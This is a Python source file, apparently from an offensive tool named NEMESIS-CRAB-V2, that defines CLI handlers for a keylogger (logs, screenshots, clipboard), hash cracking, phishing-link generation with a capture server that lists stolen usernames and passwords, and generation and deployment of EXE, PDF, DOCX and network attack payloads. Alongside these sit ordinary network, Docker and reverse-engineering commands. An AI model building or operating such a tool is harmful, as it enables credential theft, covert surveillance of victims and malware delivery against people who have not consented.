    # ==================== Keylogger Commands ====================
    def _keylogger_start(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        if self.keylogger.start():
            return {'success': True, 'output': 'Keylogger started (Press F10 to stop)'}
        return {'success': False, 'output': 'Failed to start keylogger'}
    
    def _keylogger_stop(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        self.keylogger.stop()
        return {'success': True, 'output': 'Keylogger stopped'}
    
    def _keylogger_status(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        status = "🟢 Running" if self.keylogger.running else "🔴 Stopped"
        return {'success': True, 'output': f"Keylogger Status: {status}"}
    
    def _keylogger_logs(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        limit = int(args[0]) if args else 20
        logs = self.keylogger.get_keylogs(limit)
        if not logs:
            return {'success': True, 'output': 'No keylogs found'}
        output = f"Keylogger Logs ({len(logs)}):\n"
        for log in logs:
            output += f"\n[{log.get('timestamp', '')[:19]}]\n{log.get('text', '')[:200]}\n"
        return {'success': True, 'output': output}
    
    def _keylogger_screenshots(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        screenshots = self.keylogger.get_screenshots()
        if not screenshots:
            return {'success': True, 'output': 'No screenshots captured'}
        output = "Screenshots:\n"
        for s in screenshots:
            output += f"  • {s}\n"
        return {'success': True, 'output': output}
    
    def _keylogger_clipboard(self, args: List[str]) -> Dict:
        limit = int(args[0]) if args else 20
        clipboard = self.db.get_clipboard_history(limit)
        if not clipboard:
            return {'success': True, 'output': 'No clipboard history'}
        output = "Clipboard History:\n"
        for c in clipboard:
            output += f"  [{c['timestamp'][:19]}] {c['content'][:100]}\n"
        return {'success': True, 'output': output}
    
    # ==================== Cracking Commands ====================
    def _crack(self, args: List[str]) -> Dict:
        if not self.cracking:
            return {'success': False, 'output': 'Cracking engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: crack <hash_type> <hash_value> [wordlist]'}
        job_id = self.cracking.crack_hash(args[0], args[1], args[2] if len(args) > 2 else None)
        return {'success': True, 'output': f"🔓 Cracking job started: {job_id}\nHash type: {args[0]}\nUse 'crack_status {job_id}' to check progress"}
    
    def _crack_status(self, args: List[str]) -> Dict:
        if not self.cracking:
            return {'success': False, 'output': 'Cracking engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: crack_status <job_id>'}
        job = self.cracking.get_job_status(args[0])
        if not job:
            return {'success': False, 'output': f'Job {args[0]} not found'}
        output = f"🔓 Cracking Job Status: {args[0]}\n"
        output += f"  Type: {job.get('hash_type')}\n"
        output += f"  Status: {job.get('status')}\n"
        if job.get('result'):
            output += f"  Result: {job.get('result')}\n"
        if job.get('cracked'):
            output += "  ✅ Cracked!\n"
        return {'success': True, 'output': output}
    
    def _crack_list(self, args: List[str]) -> Dict:
        if not self.cracking:
            return {'success': False, 'output': 'Cracking engine not initialized'}
        jobs = self.cracking.get_all_jobs()
        if not jobs:
            return {'success': True, 'output': 'No cracking jobs found'}
        output = "🔓 Cracking Jobs:\n"
        for job in jobs:
            status = "✅" if job.get('cracked') else "🔄" if job.get('status') == 'running' else "⏳"
            output += f"  {status} {job.get('job_id')} - {job.get('hash_type')} ({job.get('status')})\n"
        return {'success': True, 'output': output}
    
    def _crack_md5(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: crack_md5 <hash> [wordlist]'}
        return self._crack(['md5', args[0]] + (args[1:] if len(args) > 1 else []))
    
    def _crack_sha1(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: crack_sha1 <hash> [wordlist]'}
        return self._crack(['sha1', args[0]] + (args[1:] if len(args) > 1 else []))
    
    def _crack_sha256(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: crack_sha256 <hash> [wordlist]'}
        return self._crack(['sha256', args[0]] + (args[1:] if len(args) > 1 else []))
    
    def _crack_sha512(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: crack_sha512 <hash> [wordlist]'}
        return self._crack(['sha512', args[0]] + (args[1:] if len(args) > 1 else []))
    
    def _crack_ntlm(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: crack_ntlm <hash> [wordlist]'}
        return self._crack(['ntlm', args[0]] + (args[1:] if len(args) > 1 else []))
    
    def _crack_bcrypt(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: crack_bcrypt <hash> [wordlist]'}
        return self._crack(['bcrypt', args[0]] + (args[1:] if len(args) > 1 else []))
    
    def _crack_all(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: crack_all <hash> [wordlist]'}
        hash_value = args[0]
        wordlist = args[1] if len(args) > 1 else None
        results = {}
        for hash_type in ['md5', 'sha1', 'sha256', 'sha512', 'ntlm']:
            job_id = self.cracking.crack_hash(hash_type, hash_value, wordlist)
            results[hash_type] = job_id
        output = f"🔓 Multi-hash cracking jobs started:\n"
        for ht, jid in results.items():
            output += f"  • {ht}: {jid}\n"
        return {'success': True, 'output': output}
    
    # ==================== Docker Commands ====================
    def _docker_scan(self, args: List[str]) -> Dict:
        if not self.docker_scanner:
            return {'success': False, 'output': 'Docker scanner not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: docker_scan <image>'}
        result = self.docker_scanner.scan_image(args[0])
        if result['success']:
            output = f"🐳 Docker scan of {args[0]} completed\n"
            output += f"  Severity: {result.get('severity', 'unknown')}\n"
            output += f"  Vulnerabilities: {len(result.get('vulnerabilities', []))}\n"
            return {'success': True, 'output': output}
        return {'success': False, 'output': result.get('error', 'Scan failed')}
    
    def _docker_info(self, args: List[str]) -> Dict:
        return self._generic('docker info')
    
    def _docker_ps(self, args: List[str]) -> Dict:
        return self._generic('docker ps')
    
    def _docker_images(self, args: List[str]) -> Dict:
        return self._generic('docker images')
    
    def _docker_bench(self, args: List[str]) -> Dict:
        return self._generic('docker run --rm -it --net host --pid host --cap-add audit_control -v /var/lib:/var/lib -v /var/run/docker.sock:/var/run/docker.sock -v /etc:/etc -v /usr/lib/systemd:/usr/lib/systemd docker/docker-bench-security')
    
    # ==================== Reverse Engineering Commands ====================
    def _re_strings(self, args: List[str]) -> Dict:
        if not self.re_tools:
            return {'success': False, 'output': 'Reverse engineering tools not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: re_strings <file> [min_length]'}
        result = self.re_tools.extract_strings(args[0], int(args[1]) if len(args) > 1 else None)
        return {'success': True, 'output': result[:5000]}
    
    def _re_hexdump(self, args: List[str]) -> Dict:
        if not self.re_tools:
            return {'success': False, 'output': 'Reverse engineering tools not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: re_hexdump <file> [offset] [length]'}
        offset = int(args[1]) if len(args) > 1 else 0
        length = int(args[2]) if len(args) > 2 else 256
        result = self.re_tools.hex_dump(args[0], offset, length)
        return {'success': True, 'output': result}
    
    def _re_disassemble(self, args: List[str]) -> Dict:
        if not self.re_tools:
            return {'success': False, 'output': 'Reverse engineering tools not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: re_disassemble <file>'}
        result = self.re_tools.disassemble(args[0])
        return {'success': True, 'output': result[:5000]}
    
    def _re_decompile(self, args: List[str]) -> Dict:
        if not self.re_tools:
            return {'success': False, 'output': 'Reverse engineering tools not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: re_decompile <file>'}
        result = self.re_tools.decompile(args[0])
        return {'success': True, 'output': result[:5000]}
    
    def _re_decode(self, args: List[str]) -> Dict:
        if not self.re_tools:
            return {'success': False, 'output': 'Reverse engineering tools not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: re_decode <data> <encoding>'}
        result = self.re_tools.decode_obfuscated(args[0], args[1])
        return {'success': True, 'output': result}
    
    def _re_metadata(self, args: List[str]) -> Dict:
        if not self.re_tools:
            return {'success': False, 'output': 'Reverse engineering tools not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: re_metadata <file>'}
        result = self.re_tools.analyze_metadata(args[0])
        return {'success': True, 'output': result}
    
    def _re_extract(self, args: List[str]) -> Dict:
        if not self.re_tools:
            return {'success': False, 'output': 'Reverse engineering tools not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: re_extract <file>'}
        result = self.re_tools.extract_embedded(args[0])
        return {'success': True, 'output': result}
    
    def _re_analyze(self, args: List[str]) -> Dict:
        if not self.re_tools:
            return {'success': False, 'output': 'Reverse engineering tools not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: re_analyze <file>'}
        
        output = f"🔬 Complete Analysis of {args[0]}\n"
        output += "=" * 50 + "\n\n"
        output += self.re_tools.analyze_metadata(args[0]) + "\n\n"
        output += self.re_tools.extract_strings(args[0])[:2000]
        
        return {'success': True, 'output': output}
    
    def _re_list(self, args: List[str]) -> Dict:
        jobs = self.db.get_re_jobs()
        if not jobs:
            return {'success': True, 'output': 'No reverse engineering jobs found'}
        output = "🔬 Reverse Engineering Jobs:\n"
        for j in jobs:
            output += f"  • {j['job_id']} - {j['file_path']} ({j['analysis_type']})\n"
        return {'success': True, 'output': output}
    
    # ==================== Social Engineering ====================
    def _phish(self, platform: str) -> Dict:
        result = self.social.generate_phishing_link(platform)
        if result['success']:
            output = f"🎣 Phishing link generated for {platform}\n"
            output += f"Link ID: {result['link_id']}\n"
            output += f"\nTo start server: phish_start {result['link_id']}"
            return {'success': True, 'output': output}
        return {'success': False, 'output': 'Failed to generate phishing link'}
    
    def _phish_start(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: phish_start <link_id> [port]'}
        port = int(args[1]) if len(args) > 1 else 8080
        if self.social.start_server(args[0], port):
            return {'success': True, 'output': f"🎣 Phishing server started on port {port}"}
        return {'success': False, 'output': f"Failed to start server for link {args[0]}"}
    
    def _phish_stop(self, args: List[str]) -> Dict:
        self.social.stop_server()
        return {'success': True, 'output': 'Phishing server stopped'}
    
    def _phish_creds(self, args: List[str]) -> Dict:
        link_id = args[0] if args else None
        creds = self.social.get_captured_credentials(link_id)
        if not creds:
            return {'success': True, 'output': 'No captured credentials'}
        output = f"📧 Captured Credentials ({len(creds)}):\n"
        for c in creds[:10]:
            output += f"  • {c['timestamp'][:19]} - {c['username']}:{c['password']} from {c['ip_address']}\n"
        return {'success': True, 'output': output}
    
    def _phish_list(self, args: List[str]) -> Dict:
        links = self.db.get_phishing_links()
        if not links:
            return {'success': True, 'output': 'No phishing links found'}
        output = "🎣 Phishing Links:\n"
        for l in links:
            output += f"  • {l['id']} - {l['platform']} (Clicks: {l['clicks']})\n"
        return {'success': True, 'output': output}
    
    # ==================== Payload Commands ====================
    def _payload_exe(self, args: List[str]) -> Dict:
        if not self.payload_gen:
            return {'success': False, 'output': 'Payload generator not initialized'}
        name = args[0] if args else f"payload_{int(time.time())}"
        payload = self.payload_gen.generate_exe(name)
        return {'success': True, 'output': f"EXE payload generated: {payload.id} at {payload.file_path}"}
    
    def _payload_pdf(self, args: List[str]) -> Dict:
        if not self.payload_gen:
            return {'success': False, 'output': 'Payload generator not initialized'}
        name = args[0] if args else f"payload_{int(time.time())}"
        payload = self.payload_gen.generate_pdf(name)
        return {'success': True, 'output': f"PDF payload generated: {payload.id} at {payload.file_path}"}
    
    def _payload_docx(self, args: List[str]) -> Dict:
        if not self.payload_gen:
            return {'success': False, 'output': 'Payload generator not initialized'}
        name = args[0] if args else f"payload_{int(time.time())}"
        payload = self.payload_gen.generate_docx(name)
        return {'success': True, 'output': f"DOCX payload generated: {payload.id} at {payload.file_path}"}
    
    def _payload_link(self, args: List[str]) -> Dict:
        if not self.payload_gen:
            return {'success': False, 'output': 'Payload generator not initialized'}
        name = args[0] if args else f"payload_{int(time.time())}"
        payload = self.payload_gen.generate_link(name)
        return {'success': True, 'output': f"Link payload generated: {payload.id} at {payload.file_path}"}
    
    def _payload_network(self, args: List[str]) -> Dict:
        if not self.payload_gen:
            return {'success': False, 'output': 'Payload generator not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: payload_network <name> <target_ip> [port] [type]'}
        name = args[0]
        target_ip = args[1]
        port = int(args[2]) if len(args) > 2 else 80
        attack_type = args[3] if len(args) > 3 else 'syn'
        payload = self.payload_gen.generate_network_payload(name, target_ip, port, attack_type)
        return {'success': True, 'output': f"Network payload generated: {payload.id} at {payload.file_path}"}
    
    def _payload_list(self, args: List[str]) -> Dict:
        if not self.payload_gen:
            return {'success': False, 'output': 'Payload generator not initialized'}
        payloads = self.payload_gen.list_payloads(args[0] if args else None)
        if not payloads:
            return {'success': True, 'output': 'No payloads found'}
        output = "Payloads:\n"
        for p in payloads:
            output += f"  • {p['id']} - {p['name']} ({p['payload_type']})\n"
        return {'success': True, 'output': output}
    
    def _payload_deploy(self, args: List[str]) -> Dict:
        if not self.payload_gen:
            return {'success': False, 'output': 'Payload generator not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: payload_deploy <id> <deployment_type> [target]'}
        result = self.payload_gen.deploy_payload(args[0], args[1], args[2] if len(args) > 2 else None)
        return {'success': result.get('success', False), 'output': result.get('message', '')}
    
    # ==================== Domain Translation ====================
    def _ip_to_domain(self, args: List[str]) -> Dict:
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: ip_to_domain <ip>'}
        domain = self.domain_hosting.translate_ip_to_domain(args[0])
        if domain:
            return {'success': True, 'output': f"Domain for IP {args[0]}: {domain}"}
        return {'success': False, 'output': f"No domain found for IP {args[0]}"}
    
    def _domain_to_ip(self, args: List[str]) -> Dict:
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: domain_to_ip <domain>'}
        ip = self.domain_hosting.translate_domain_to_ip(args[0])
        if ip:
            return {'success': True, 'output': f"IP for domain {args[0]}: {ip}"}
        return {'success': False, 'output': f"No IP found for domain {args[0]}"}
    
    def _host_domain(self, args: List[str]) -> Dict:
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: host_domain <ip> <domain> [port]'}
        port = int(args[2]) if len(args) > 2 else 8080
        domain_host = self.domain_hosting.host_domain(args[0], args[1], port)
        if domain_host:
            return {'success': True, 'output': f"Domain {args[1]} hosted on IP {args[0]}:{port}"}
        return {'success': False, 'output': f"Failed to host domain {args[1]}"}
    
    def _host_website(self, args: List[str]) -> Dict:
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: host_website <domain> <html_file>'}
        try:
            with open(args[1], 'r') as f:
                html_content = f.read()
            if self.domain_hosting.host_website(args[0], html_content):
                return {'success': True, 'output': f"Website hosted on http://{args[0]}"}
            return {'success': False, 'output': f"Failed to host website on {args[0]}"}
        except Exception as e:
            return {'success': False, 'output': f"Error: {e}"}
    
    def _list_domains(self, args: List[str]) -> Dict:
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting engine not initialized'}
        domains = self.domain_hosting.list_hosted_domains()
        if not domains:
            return {'success': True, 'output': 'No hosted domains'}
        output = "Hosted Domains:\n"
        for d in domains:
            output += f"  • {d['domain']} -> {d['ip']} ({'Active' if d['active'] else 'Inactive'})\n"
        return {'success': True, 'output': output}
    
    def _domain_info(self, args: List[str]) -> Dict:
        if not self.domain_hosting:
            return {'success': False, 'output': 'Domain hosting engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: domain_info <domain>'}
        domains = self.domain_hosting.list_hosted_domains()
        for d in domains:
            if d['domain'] == args[0]:
                return {'success': True, 'output': json.dumps(d, indent=2)}
        return {'success': False, 'output': f"Domain {args[0]} not found"}
    
    # ==================== IP Management ====================
    def _add_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: add_ip <ip> [notes]'}
        notes = ' '.join(args[1:]) if len(args) > 1 else ''
        domain = NetworkTools.ip_to_domain(args[0])
        try:
            ipaddress.ip_address(args[0])
            if self.db.add_managed_ip(args[0], domain, 'cli', notes):
                return {'success': True, 'output': f'✅ IP {args[0]} added (Domain: {domain or "Unknown"})'}
            return {'success': False, 'output': f'Failed to add IP {args[0]}'}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {args[0]}'}
    
    def _remove_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: remove_ip <ip>'}
        self.db.conn.execute("DELETE FROM managed_ips WHERE ip_address = ?", (args[0],))
        self.db.conn.commit()
        return {'success': True, 'output': f'✅ IP {args[0]} removed'}
    
    def _block_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: block_ip <ip> [reason]'}
        reason = ' '.join(args[1:]) if len(args) > 1 else 'Manually blocked'
        if NetworkTools.block_ip(args[0]) or self.db.block_ip(args[0], reason, 'cli'):
            return {'success': True, 'output': f'🔒 IP {args[0]} blocked: {reason}'}
        return {'success': False, 'output': f'Failed to block IP {args[0]}'}
    
    def _unblock_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: unblock_ip <ip>'}
        if NetworkTools.unblock_ip(args[0]) or self.db.unblock_ip(args[0]):
            return {'success': True, 'output': f'🔓 IP {args[0]} unblocked'}
        return {'success': False, 'output': f'Failed to unblock IP {args[0]}'}
    
    def _list_ips(self, args: List[str]) -> Dict:
        include_blocked = not (args and args[0].lower() == 'active')
        ips = self.db.get_managed_ips(include_blocked)
        if not ips:
            return {'success': True, 'output': 'No managed IPs'}
        output = "📋 Managed IPs:\n"
        for ip in ips:
            status = "🔒" if ip['is_blocked'] else "🟢"
            output += f"  {status} {ip['ip_address']} ({ip.get('domain', 'Unknown')})\n"
        return {'success': True, 'output': output}
    
    def _ip_info(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ip_info <ip>'}
        try:
            ipaddress.ip_address(args[0])
            db_info = self.db.conn.execute("SELECT * FROM managed_ips WHERE ip_address = ?", (args[0],)).fetchone()
            location = NetworkTools.location(args[0])
            domain = NetworkTools.ip_to_domain(args[0])
            
            output = f"🔍 IP Information: {args[0]}\n{'='*40}\n"
            if domain:
                output += f"🌐 Domain: {domain}\n"
            if db_info:
                output += f"📊 Status: {'🔒 Blocked' if db_info['is_blocked'] else '🟢 Active'}\n"
                output += f"📅 Added: {db_info['added_date'][:10]}\n"
            if location.get('success'):
                output += f"📍 Location: {location.get('country')}, {location.get('city')}\n"
                output += f"📡 ISP: {location.get('isp')}\n"
            return {'success': True, 'output': output}
        except ValueError:
            return {'success': False, 'output': f'Invalid IP: {args[0]}'}
    
    def _analyze_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: analyze_ip <ip>'}
        ip = args[0]
        
        ping_result = self.tools.ping(ip, 4)
        location = self.tools.location(ip)
        nmap_result = self.tools.nmap(ip, 'quick')
        domain = NetworkTools.ip_to_domain(ip)
        
        output = f"🦀 NEMESIS-CRAB-V2 IP Analysis Report for {ip}\n"
        output += "=" * 50 + "\n\n"
        
        if domain:
            output += f"🌐 Domain: {domain}\n\n"
        
        output += "📡 Ping Results:\n" + ping_result.output[:500] + "\n\n"
        
        if location.get('success'):
            output += "📍 Geolocation:\n"
            output += f"  Country: {location.get('country')}\n"
            output += f"  City: {location.get('city')}\n"
            output += f"  ISP: {location.get('isp')}\n\n"
        
        output += "🔍 Port Scan Results:\n" + nmap_result.output[:1000] + "\n\n"
        
        return {'success': True, 'output': output}
    
    # ==================== Network Commands ====================
    def _whois(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: whois <domain>'}
        result = self.tools.whois(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _dns(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: dns <domain> [type]'}
        record_type = args[1] if len(args) > 1 else 'A'
        result = self.tools.dns(args[0], record_type)
        return {'success': result.success, 'output': result.output}
    
    def _dig(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: dig <domain>'}
        return self._generic(f'dig {args[0]}')
    
    def _nslookup(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nslookup <domain>'}
        return self._generic(f'nslookup {args[0]}')
    
    def _location(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: location <ip>'}
        result = self.tools.location(args[0])
        if result.get('success'):
            output = f"📍 Location for {args[0]}:\n"
            output += f"  Country: {result.get('country', 'Unknown')}\n"
            output += f"  City: {result.get('city', 'Unknown')}\n"
            output += f"  ISP: {result.get('isp', 'Unknown')}"
            return {'success': True, 'output': output}
        return {'success': False, 'output': f"Could not get location for {args[0]}"}
    
    def _scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: scan <target>'}
        result = self.tools.nmap(args[0], 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _quick_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: quick_scan <target>'}
        result = self.tools.nmap(args[0], 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _full_scan(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: full_scan <target>'}
        result = self.tools.nmap(args[0], 'full')
        return {'success': result.success, 'output': result.output}
    
    # ==================== Report Commands ====================
    def _report_pdf(self, args: List[str]) -> Dict:
        if not self.report_gen:
            return {'success': False, 'output': 'Report generator not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: report_pdf <target>'}
        report_path = self.report_gen.generate_pdf_report({'target': args[0]}, args[0])
        if report_path:
            return {'success': True, 'output': f"PDF report generated: {report_path}"}
        return {'success': False, 'output': 'Failed to generate PDF report'}
    
    def _report_json(self, args: List[str]) -> Dict:
        if not self.report_gen:
            return {'success': False, 'output': 'Report generator not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: report_json <target>'}
        report_path = self.report_gen.generate_json_report({'target': args[0]}, args[0])
        if report_path:
            return {'success': True, 'output': f"JSON report generated: {report_path}"}
        return {'success': False, 'output': 'Failed to generate JSON report'}
    
    def _report_both(self, args: List[str]) -> Dict:
        if not self.report_gen:
            return {'success': False, 'output': 'Report generator not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: report_both <target>'}
        reports = self.report_gen.generate_report({'target': args[0]}, args[0])
        if reports:
            output = f"Reports generated for {args[0]}:\n"
            for fmt, path in reports.items():
                output += f"  • {fmt.upper()}: {path}\n"
            return {'success': True, 'output': output}
        return {'success': False, 'output': 'Failed to generate reports'}
    
    def _report_list(self, args: List[str]) -> Dict:
        reports = self.db.get_reports()
        if not reports:
            return {'success': True, 'output': 'No reports found'}
        output = "Reports:\n"
        for r in reports:
            output += f"  • {r['report_type']}: {r['report_path']}\n"
        return {'success': True, 'output': output}
    
    # ==================== System Commands ====================
    def _status(self, args: List[str]) -> Dict:
        stats = self.db.get_statistics()
        output = f"""
🦀 NEMESIS-CRAB-V2 System Status
{'='*40}
📊 Statistics:
  Total Commands: {stats.get('total_commands', 0)}
  Total Threats: {stats.get('total_threats', 0)}
  Managed IPs: {stats.get('total_managed_ips', 0)}
  Blocked IPs: {stats.get('blocked_ips', 0)}
  SSH Connections: {stats.get('total_ssh_connections', 0)}
  Phishing Links: {stats.get('total_phishing_links', 0)}
  Captured Credentials: {stats.get('captured_credentials', 0)}
  Keylog Entries: {stats.get('total_keylogs', 0)}
  DOS Attacks: {stats.get('total_dos_attacks', 0)}
  Deployments: {stats.get('total_deployments', 0)}
  Docker Scans: {stats.get('total_docker_scans', 0)}
  Cracking Jobs: {stats.get('total_cracking_jobs', 0)}
  RE Jobs: {stats.get('total_re_jobs', 0)}

💻 System Info:
  Platform: {platform.system()} {platform.release()}
  Hostname: {socket.gethostname()}
  Local IP: {NetworkTools.get_local_ip()}
  CPU: {psutil.cpu_percent()}%
  Memory: {psutil.virtual_memory().percent}%
  Disk: {psutil.disk_usage('/').percent}%
"""
        return {'success': True, 'output': output}
    
    def _history(self, args: List[str]) -> Dict:
        limit = int(args[0]) if args and args[0].isdigit() else 20
        history = self.db.conn.execute(
            "SELECT command, source, timestamp, success FROM command_history ORDER BY timestamp DESC LIMIT ?",
            (limit,)
        ).fetchall()
        if not history:
            return {'success': True, 'output': 'No command history'}
        output = "📜 Command History:\n"
        for h in history:
            status = "✅" if h['success'] else "❌"
            output += f"  {status} {h['timestamp'][:19]} - {h['command'][:50]}\n"
        return {'success': True, 'output': output}
    
    def _system(self, args: List[str]) -> Dict:
        output = f"""
💻 System Information
{'='*40}
OS: {platform.system()} {platform.release()} {platform.version()}
Hostname: {socket.gethostname()}
Python: {sys.version}
CPU Cores: {psutil.cpu_count()}
CPU Usage: {psutil.cpu_percent()}%
Memory: {psutil.virtual_memory().total / (1024**3):.1f}GB total, {psutil.virtual_memory().percent}% used
Disk: {psutil.disk_usage('/').total / (1024**3):.1f}GB total, {psutil.disk_usage('/').percent}% used
Boot Time: {datetime.datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')}
"""
        return {'success': True, 'output': output}
    
    def _threats(self, args: List[str]) -> Dict:
        limit = int(args[0]) if args and args[0].isdigit() else 10
        threats = self.db.get_recent_threats(limit)
        if not threats:
            return {'success': True, 'output': 'No threats detected'}
        output = "🚨 Recent Threats:\n"
        for t in threats:
            severity_color = "🔴" if t['severity'] in ['critical', 'high'] else "🟡" if t['severity'] == 'medium' else "🟢"
            output += f"  {severity_color} {t['timestamp'][:19]} - {t['threat_type']} from {t['source_ip']} ({t['severity']})\n"
        return {'success': True, 'output': output}
    
    def _clear(self, args: List[str]) -> Dict:
        os.system('cls' if os.name == 'nt' else 'clear')
        return {'success': True, 'output': ''}
    
    def _generic(self, command: str) -> Dict:
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
            return {'success': result.returncode == 0, 'output': result.stdout if result.stdout else result.stderr}
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Command timed out'}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _help(self, args: List[str]) -> Dict:
        help_text = f"""
{Colors.PURPLE}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.BLUE}        🦀 NEMESIS-CRAB-V2 v2.0.0 - HELP MENU                           {Colors.PURPLE}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.ORANGE}                                                                           {Colors.PURPLE}║
║{Colors.BLUE}📡 PING COMMANDS:{Colors.RESET}
║  ping <target> [count]         - Ping a target
║  ping6 <target>                - IPv6 ping
║  ping_sweep <network>          - Ping sweep entire network
║  fping <targets...>            - Fast ping multiple targets
║  ping_flood <target>           - Flood ping
║  ping_mtu <target> <size>      - Ping with MTU
║  ping_size <target> <size>     - Ping with packet size
║  ping_count <target> <count>   - Ping with count
║  ping_interval <target> <sec>  - Ping with interval
║  ping_timeout <target> <sec>   - Ping with timeout
║  ping_ttl <target> <ttl>       - Ping with TTL
║  ping_interface <target> <if>  - Ping with interface
║  ping_source <target> <ip>     - Ping with source IP
║  ping_pattern <target> <pat>   - Ping with pattern
║  ping_record <target>          - Ping with record route
║  ping_timestamp <target>       - Ping with timestamps
║  ping_quiet <target>           - Quiet ping
║  ping_verbose <target>         - Verbose ping
║
║{Colors.BLUE}🔍 TRACEROUTE COMMANDS:{Colors.RESET}
║  traceroute <target>           - Trace route
║  traceroute6 <target>          - IPv6 trace route
║  traceroute_tcp <target>       - TCP traceroute
║  traceroute_udp <target>       - UDP traceroute
║  traceroute_icmp <target>      - ICMP traceroute
║  traceroute_max_hops <t> <n>   - Max hops
║  traceroute_first_hop <t> <n>  - First hop
║  traceroute_queries <t> <n>    - Queries per hop
║  traceroute_wait <t> <sec>     - Wait time
║  traceroute_port <t> <port>    - Port
║  traceroute_numeric <target>   - Numeric output
║  mtr <target>                  - MTR traceroute
║  mtr_report <target>           - MTR report
║  mtr_json <target>             - MTR JSON
║  mtr_csv <target>              - MTR CSV
║  tcptraceroute <target>        - TCP traceroute
║  lft <target>                  - Layer Four Traceroute
║
║{Colors.BLUE}🌐 WGET COMMANDS:{Colors.RESET}
║  wget <url>                    - Download file
║  wget_output <url> <file>      - Download to file
║  wget_continue <url>           - Continue download
║  wget_background <url>         - Background download
║  wget_quiet <url>              - Quiet download
║  wget_recursive <url>          - Recursive download
║  wget_mirror <url>             - Mirror website
║  wget_spider <url>             - Spider website
║  wget_input <file>             - Download from file
║  wget_header <url> <header>    - Custom header
║  wget_user_agent <url> <ua>    - User agent
║  wget_referer <url> <ref>      - Referer
║  wget_cookies <url> <file>     - Load cookies
║  wget_save_cookies <url> <f>   - Save cookies
║  wget_limit_rate <url> <rate>  - Limit rate
║  wget_timeout <url> <sec>      - Timeout
║  wget_tries <url> <count>      - Retries
║  wget_retry <url>              - Retry refused
║  wget_no_check_cert <url>      - Skip cert check
║  wget_certificate <url> <cert> - Client cert
║  wget_private_key <url> <key>  - Private key
║  wget_ca_certificate <url> <ca>- CA cert
║  wget_proxy <url> <proxy>      - Use proxy
║  wget_no_proxy <url>           - No proxy
║  wget_user <url> <user>        - HTTP user
║  wget_password <url> <pass>    - HTTP password
║  wget_post_data <url> <data>   - POST data
║  wget_post_file <url> <file>   - POST file
║  wget_method <url> <method>    - HTTP method
║  wget_body_data <url> <data>   - Body data
║  wget_body_file <url> <file>   - Body file
║  wget_timestamping <url>       - Timestamping
